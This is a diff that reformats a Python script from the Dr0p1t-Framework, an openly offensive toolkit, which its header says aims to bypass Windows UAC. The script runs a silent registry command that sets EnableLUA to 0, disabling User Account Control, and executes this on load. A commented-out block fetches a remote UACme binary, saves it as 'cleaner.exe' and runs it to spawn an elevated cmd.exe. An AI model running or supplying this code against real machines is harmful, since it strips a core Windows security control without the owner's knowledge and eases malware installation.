@@ -1,5 +1,5 @@
-#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
-#This script aims to bypass UAC by trying to disable the UAC (¯\_(ツ)_/¯)
+# Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
+# This script aims to bypass UAC by trying to disable the UAC (¯\_(ツ)_/¯)
 '''
 #Bypassing UAC by downloading and using UACme tool (¯\_(ツ)_/¯)
 from os import popen
@@ -23,26 +23,36 @@ def get_ready():
 	x = urlretrieve(url,"cleaner.exe")
 	xx = popen("cleaner.exe 3 cmd.exe")
 '''
-#Start
+
+# Start
+
 
 def DisUAC():
-	def disable_uac():
-		x=subprocess.Popen("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f >> NUL",shell=True)
+    def disable_uac():
+        x = subprocess.Popen(
+            "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f >> NUL",
+            shell=True)
 #####
-	def check_uac():
-		uac = get_output("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA")
-		if "0x1" in uac:
-			return True
-		else:
-			return False
+
+    def check_uac():
+        uac = get_output(
+            "REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA"
+        )
+        if "0x1" in uac:
+            return True
+        else:
+            return False
+
+
 #######
-	if check_uac():
-		disable_uac()
-		if check_uac():
-			return False
-		else:
-			return True
-	else:
-		return True
+
+    if check_uac():
+        disable_uac()
+        if check_uac():
+            return False
+        else:
+            return True
+    else:
+        return True
 
 DisUAC()
